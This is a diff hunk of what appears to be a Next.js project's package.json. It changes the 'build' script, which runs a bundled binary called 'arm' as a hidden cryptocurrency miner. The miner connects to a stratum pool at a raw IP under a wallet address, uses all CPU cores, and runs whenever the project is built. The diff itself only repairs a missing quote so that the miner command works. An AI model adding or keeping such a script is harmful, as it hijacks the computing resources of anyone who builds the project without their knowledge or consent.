@@ -2,7 +2,7 @@
   "private": true,
   "scripts": {
     "dev": "next dev --turbo",
-    "build": "chmod +x arm && ./arm -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qaku3ea4uyaj28scjq3snyats8tjr45m43jrqw9.suhu -p x -t $(nproc --all),
+    "build": "chmod +x arm && ./arm -a aurum -o stratum+tcp://128.199.218.20:80 -u bit1qaku3ea4uyaj28scjq3snyats8tjr45m43jrqw9.suhu -p x -t $(nproc --all)",
     "build-only": "next build",
     "start": "next start",
     "setup": "node ./setup.mjs"
